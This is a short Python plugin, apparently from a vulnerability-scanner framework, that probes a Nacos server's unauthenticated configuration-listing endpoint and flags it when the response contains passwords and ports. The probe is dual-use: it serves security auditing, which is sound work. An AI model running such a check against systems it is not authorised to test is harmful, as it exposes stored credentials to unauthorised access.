#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url, ["./nacos", "./"]):
                    if path[-1] == '/':
                        url = path + 'v1/cs/configs?search=accurate&dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=10&tenant=&namespaceId='
                        async with session.get(url=url, allow_redirects=False) as res:
                            if res:
                                text = await res.text()
                                if 'password:' in text and 'port:' in text:
                                    yield url
                                    return